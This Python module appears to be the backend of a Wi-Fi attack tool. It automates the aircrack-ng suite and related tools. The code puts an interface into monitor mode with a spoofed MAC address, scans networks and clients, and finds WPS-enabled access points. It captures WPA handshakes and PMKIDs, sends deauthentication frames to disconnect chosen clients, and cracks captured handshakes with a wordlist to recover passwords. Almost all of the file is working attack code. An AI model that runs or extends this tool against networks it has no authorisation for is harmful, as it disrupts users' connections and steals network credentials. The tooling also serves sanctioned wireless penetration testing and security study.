import os
import re
import csv
import time
import signal
import shutil
import subprocess
import requests
import logging
import shlex
import json

# --- Initialization ---
logging.basicConfig(
    filename='intruder.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
CAPTURES_DIR = "/opt/intruder/captures"
os.makedirs(CAPTURES_DIR, exist_ok=True)

# --- Core Command Execution ---
def _run_sync_command(command, capture_output=False, text=True):
    """
    Executes a short-lived, synchronous system command safely with error handling.
    Ideal for configuration and management tasks (e.g., ip, iw, macchanger).
    """
    logging.info(f"Executing (sync): {command}")
    try:
        result = subprocess.run(
            shlex.split(command),
            capture_output=capture_output,
            text=text,
            check=True,
            stderr=subprocess.PIPE
        )
        return {'success': True, 'output': result.stdout if capture_output else ""}
    except FileNotFoundError:
        error_msg = f"Command not found: {shlex.split(command)[0]}"
        logging.error(error_msg)
        return {'success': False, 'error': error_msg}
    except subprocess.CalledProcessError as e:
        error_output = e.stderr.strip()
        logging.error(f"Command failed: {command} | Error: {error_output}")
        return {'success': False, 'error': error_output}

# --- OUI Lookup Utility ---
class OUILookup:
    """Handles fetching and parsing the IEEE OUI list to find device manufacturers."""
    def __init__(self, cache_file='/tmp/oui.txt', cache_duration_days=30):
        self.cache_file = cache_file
        self.cache_duration_sec = cache_duration_days * 86400
        self.oui_db = {}
        self._load_database()

    def _download_db(self):
        logging.info("Downloading latest OUI database from IEEE...")
        try:
            url = 'http://standards-oui.ieee.org/oui/oui.txt'
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, timeout=15, headers=headers)
            r.raise_for_status()
            with open(self.cache_file, 'w', encoding='utf-8') as f: f.write(r.text)
            return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Could not download OUI database: {e}")
            return False

    def _load_database(self):
        is_cache_stale = not os.path.exists(self.cache_file) or \
                         (time.time() - os.path.getmtime(self.cache_file)) > self.cache_duration_sec
        if is_cache_stale:
            if not self._download_db() and not os.path.exists(self.cache_file):
                logging.error("OUI database unavailable and cannot be downloaded.")
                return
        try:
            with open(self.cache_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if '(hex)' in line:
                        parts = line.split('(hex)')
                        oui = parts[0].strip().replace('-', '').upper()
                        manufacturer = parts[1].strip()
                        self.oui_db[oui] = manufacturer
            logging.info(f"Loaded {len(self.oui_db)} OUI entries into memory.")
        except Exception as e:
            logging.error(f"Error loading OUI database cache: {e}")
    
    def lookup(self, mac_address):
        """Looks up the manufacturer from a given MAC address."""
        if not isinstance(mac_address, str): return "Invalid MAC"
        oui = mac_address.replace(':', '').replace('-', '').upper()[:6]
        return self.oui_db.get(oui, "Unknown")

# --- WiFi Scanning Engine ---
class WifiScanner:
    """Manages airodump-ng scans and parses the results."""
    def __init__(self, interface):
        if not interface: raise ValueError("A wireless interface must be provided.")
        self.interface = shlex.quote(interface)
        self.scan_process = None
        self.csv_prefix = f"/tmp/intruder_scan_{os.getpid()}"
        self.csv_filename = ""

    def start_scan(self, duration=60):
        self._cleanup_files()
        command = f"timeout {duration}s airodump-ng {self.interface} -w {shlex.quote(self.csv_prefix)} --output-format csv --write-interval 1"
        logging.info(f"Starting async scan: {command}")
        self.scan_process = subprocess.Popen(shlex.split(command), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2) # Give airodump-ng time to create the file
        for f in os.listdir('/tmp/'):
            if f.startswith(os.path.basename(self.csv_prefix)) and f.endswith('.csv'):
                self.csv_filename = f"/tmp/{f}"
                logging.info(f"Airodump-ng CSV file detected: {self.csv_filename}")
                return True
        logging.error("airodump-ng did not create an output .csv file in /tmp.")
        return False

    def stop_scan(self):
        if self.scan_process and self.scan_process.poll() is None:
            logging.info("Stopping scan process...")
            try:
                os.kill(self.scan_process.pid, signal.SIGINT)
                self.scan_process.wait(timeout=5)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                if self.scan_process.poll() is None: os.kill(self.scan_process.pid, signal.SIGKILL)
            self.scan_process = None

    def parse_scan_results(self, oui_lookup_tool):
        if not self.csv_filename or not os.path.exists(self.csv_filename):
            logging.error("Scan result file not found or already cleaned up.")
            return [], []

        networks = {}
        clients = {}
        current_section = None

        try:
            with open(self.csv_filename, 'r', newline='', encoding='utf-8') as f:
                reader = csv.reader(f, skipinitialspace=True)
                for row_num, row in enumerate(reader):
                    if not row or not row[0].strip():
                        current_section = None
                        continue

                    first_col = row[0].strip()
                    if first_col == 'BSSID':
                        current_section = 'networks'
                        continue
                    elif first_col == 'Station MAC':
                        current_section = 'clients'
                        continue

                    if current_section == 'networks' and len(row) >= 14:
                        try:
                            bssid = row[0].strip()
                            if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid): continue
                            networks[bssid] = {
                                'bssid': bssid,
                                'essid': row[13].strip() if row[13].strip() else '<hidden>',
                                'power': int(row[8].strip() or '0'),
                                'channel': int(row[3].strip() or '0'),
                                'privacy': row[5].strip(),
                                'auth': row[7].strip(),
                                'manufacturer': oui_lookup_tool.lookup(bssid),
                                'clients_count': 0,
                                'wps': False,
                                'first_seen': row[1].strip(),
                                'last_seen': row[2].strip(),
                            }
                        except (ValueError, IndexError) as e:
                            logging.warning(f"Error parsing network row {row_num}: {row} - {e}")
                            continue
                    elif current_section == 'clients' and len(row) >= 6:
                        try:
                            client_mac = row[0].strip()
                            if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', client_mac): continue
                            connected_bssid = row[5].strip()
                            probed_essids = [e.strip() for e in row[6:] if e.strip()]
                            if client_mac not in clients:
                                clients[client_mac] = {
                                    'mac': client_mac,
                                    'power': int(row[4].strip() or '0'),
                                    'manufacturer': oui_lookup_tool.lookup(client_mac),
                                    'connected_to_bssid': connected_bssid if connected_bssid != '(not associated)' else None,
                                    'probed_essids': list(set(probed_essids)),
                                    'first_seen': row[1].strip(),
                                    'last_seen': row[2].strip(),
                                    'os_info': {},
                                    'hostname': None,
                                    'ip_address': None,
                                }
                            else:
                                existing_client = clients[client_mac]
                                if connected_bssid and connected_bssid != '(not associated)':
                                    existing_client['connected_to_bssid'] = connected_bssid
                                existing_client['probed_essids'].extend([e for e in probed_essids if e not in existing_client['probed_essids']])
                                existing_client['power'] = max(existing_client['power'], int(row[4].strip() or '0'))
                                existing_client['last_seen'] = row[2].strip()
                        except (ValueError, IndexError) as e:
                            logging.warning(f"Error parsing client row {row_num}: {row} - {e}")
                            continue
        except Exception as e:
            logging.error(f"Error reading or parsing scan results CSV: {e}", exc_info=True)
        
        for client_mac, client_data in clients.items():
            if client_data['connected_to_bssid'] in networks:
                networks[client_data['connected_to_bssid']]['clients_count'] += 1
        
        self._cleanup_files()
        return list(networks.values()), list(clients.values())

    def _cleanup_files(self):
        for f in os.listdir('/tmp/'):
            if f.startswith(os.path.basename(self.csv_prefix)):
                try:
                    file_path = os.path.join('/tmp', f)
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                        logging.debug(f"Cleaned up scan artifact: {file_path}")
                except OSError as e:
                    logging.warning(f"Could not remove scan artifact {file_path}: {e}")

# --- Core Wireless Functions ---
def get_wireless_interfaces():
    result = _run_sync_command("iw dev", capture_output=True)
    interfaces = []
    if result['success']:
        found = re.compile(r'^\s*Interface\s+(\S+)', re.MULTILINE).findall(result['output'])
        for name in found: interfaces.append({'name': name})
    return interfaces

def get_original_mac(interface):
    result = _run_sync_command(f"macchanger -s {shlex.quote(interface)}", capture_output=True)
    if result['success']:
        match = re.search(r'Permanent MAC:\s*([0-9a-fA-F:]{17})', result['output'])
        if match: return match.group(1)
    return None

def enable_monitor_mode(interface):
    logging.info(f"Enabling monitor mode on {interface} with MAC spoofing...")
    s_iface = shlex.quote(interface)
    original_mac = get_original_mac(s_iface)
    if not original_mac: return {'success': False, 'error': "Could not retrieve original MAC."}
    with open(f"/tmp/intruder_{s_iface}_mac", "w") as f: f.write(original_mac)
    commands = [
        f"ip link set {s_iface} down",
        f"macchanger -r {s_iface}",
        f"iw {s_iface} set monitor control",
        f"ip link set {s_iface} up"
    ]
    for cmd in commands:
        result = _run_sync_command(cmd)
        if not result['success']: return result
    return {'success': True, 'interface': interface}

def disable_monitor_mode(mon_interface):
    logging.info(f"Disabling monitor mode and restoring original MAC on {mon_interface}...")
    s_iface = shlex.quote(mon_interface)
    mac_file = f"/tmp/intruder_{s_iface}_mac"
    commands = [
        f"ip link set {s_iface} down",
        f"iw {s_iface} set type managed",
    ]
    if os.path.exists(mac_file):
        with open(mac_file, "r") as f:
            original_mac = f.read().strip()
        commands.append(f"macchanger -p {s_iface}")
    commands.append(f"ip link set {s_iface} up")

    for cmd in commands:
        _run_sync_command(cmd)
    if os.path.exists(mac_file):
        try: os.remove(mac_file)
        except OSError as e: logging.warning(f"Could not remove MAC file {mac_file}: {e}")
    return {'success': True}

def cleanup_processes():
    for proc_name in ['airodump-ng', 'wash', 'hcxdumptool', 'aireplay-ng', 'aircrack-ng', 'p0f', 'tshark']:
        try:
            result = subprocess.run(['pgrep', proc_name], capture_output=True, text=True)
            if result.stdout:
                for pid in result.stdout.strip().split('\n'):
                    try:
                        os.kill(int(pid), signal.SIGKILL)
                        logging.info(f"Killed orphaned {proc_name} process with PID: {pid}")
                    except (ValueError, ProcessLookupError): continue
        except FileNotFoundError:
            logging.warning(f"'pgrep' command not found. Cannot clean up {proc_name}.")

# --- LAN Host Discovery ---
def discover_lan_hosts(interface):
    """
    Scans the local network using arp-scan to discover connected hosts.
    This requires a non-monitor-mode interface with an IP address.
    """
    if not shutil.which('arp-scan'):
        logging.error("'arp-scan' command not found. Cannot perform LAN discovery.")
        return {'success': False, 'error': "'arp-scan' not found. Please install it."}
    
    command = f"arp-scan --localnet --interface={shlex.quote(interface)}"
    result = _run_sync_command(command, capture_output=True)
    
    if not result['success']:
        # arp-scan can return non-zero on some conditions, we can still parse stderr
        if "Couldn't retrieve interface IP address and netmask" in result.get('error', ''):
             return {'success': False, 'error': f"Interface '{interface}' has no IP address. Cannot scan LAN."}
        return result

    hosts = []
    # arp-scan output format: <IP Address>   <MAC Address>   <Manufacturer>
    lan_host_pattern = re.compile(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+([0-9a-f:]{17})\s+(.*)$', re.IGNORECASE | re.MULTILINE)
    
    for match in lan_host_pattern.finditer(result.get('output', '')):
        hosts.append({
            'ip': match.group(1),
            'mac': match.group(2).upper(),
            'manufacturer': match.group(3)
        })
    
    return {'success': True, 'hosts': hosts}

# --- WPS & Offensive Capabilities (Streaming Functions) ---
def _stream_process_output(command):
    """Helper for running long-running tasks and yielding their output."""
    logging.info(f"Executing (stream): {command}")
    proc = None
    try:
        proc = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, universal_newlines=True)
        for line in iter(proc.stdout.readline, ''):
            yield line.strip()
        proc.stdout.close()
        proc.wait()
    except FileNotFoundError:
        yield f"[ERROR] Command not found: {shlex.split(command)[0]}"
    except Exception as e:
        yield f"[ERROR] Unexpected error: {e}"
    finally:
        if proc and proc.poll() is None:
            try: os.kill(proc.pid, signal.SIGINT); proc.wait(2)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                if proc.poll() is None: os.kill(proc.pid, signal.SIGKILL)

def run_wps_scan(interface, duration=20):
    wps_networks = set()
    if not shutil.which('wash'):
        logging.error("'wash' command not found. (Install reaver package)")
        return wps_networks
    command = f"timeout {duration}s wash -i {shlex.quote(interface)}"
    logging.info(f"Starting WPS scan: {command}")
    for line in _stream_process_output(command):
        if match := re.match(r'([0-9A-F:]{17})\s+', line):
            wps_networks.add(match.group(1).strip())
    logging.info(f"WPS scan complete. Found {len(wps_networks)} WPS-enabled networks.")
    return wps_networks

def capture_handshake(interface, bssid, channel, essid):
    output_prefix = os.path.join(CAPTURES_DIR, f"handshake_{essid.replace(' ', '_')}_{bssid.replace(':', '')}")
    command = f"airodump-ng --bssid {shlex.quote(bssid)} --channel {shlex.quote(str(channel))} -w {shlex.quote(output_prefix)} {shlex.quote(interface)}"
    for line in _stream_process_output(command):
        if "WPA handshake:" in line:
            yield {'type': 'handshake_captured', 'data': {'bssid': bssid, 'file': f"{output_prefix}-01.cap"}, 'msg_type': 'success', 'message': line}
            return
        else:
            yield {'type': 'terminal', 'message': line, 'msg_type': 'info'}

def capture_pmkid(interface, bssid, essid, channel):
    output_file = os.path.join(CAPTURES_DIR, f"pmkid_{bssid.replace(':', '')}.22000")
    command = f"timeout 20s hcxdumptool -i {shlex.quote(interface)} -o {shlex.quote(output_file)} --filterlist_ap={shlex.quote(bssid)} --filtermode=2 --enable_status=15 --channel={shlex.quote(str(channel))}"
    for line in _stream_process_output(command):
        yield {'type': 'terminal', 'message': line, 'msg_type': 'info'}

    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
        yield {'type': 'pmkid_captured', 'data': {'bssid': bssid, 'essid': essid, 'file': output_file, 'type': 'pmkid'}, 'msg_type': 'success', 'message': 'PMKID captured successfully.'}
    else:
        yield {'type': 'terminal', 'message': "PMKID capture failed. Target may not be vulnerable.", 'msg_type': 'warning'}

def deauth_attack(interface, bssid, client, count):
    command = f"aireplay-ng --deauth {shlex.quote(str(count))} -a {shlex.quote(bssid)} -c {shlex.quote(client)} {shlex.quote(interface)}"
    for line in _stream_process_output(command):
        yield line

def crack_handshake(file_path, wordlist):
    bssid_match = re.search(r'handshake_.*?_([0-9A-F]{12})', os.path.basename(file_path))
    if not bssid_match:
        yield {'type': 'terminal', 'message': "Could not determine BSSID from filename.", 'msg_type': 'error'}
        return
    bssid = ':'.join(a+b for a,b in zip(bssid_match.group(1)[::2], bssid_match.group(1)[1::2]))

    command = f"aircrack-ng -w {shlex.quote(wordlist)} -b {shlex.quote(bssid)} {shlex.quote(file_path)}"
    for line in _stream_process_output(command):
        if "KEY FOUND!" in line:
            password = re.search(r'\[\s*(.*?)\s*\]', line)
            if password:
                yield {'type': 'password_found', 'password': password.group(1)}
                return
        elif "Passphrase not in dictionary" in line:
            yield {'type': 'terminal', 'message': "Crack attempt finished. Password not found.", 'msg_type': 'warning'}
            return
        else:
            yield {'type': 'terminal', 'message': line, 'msg_type': 'info'}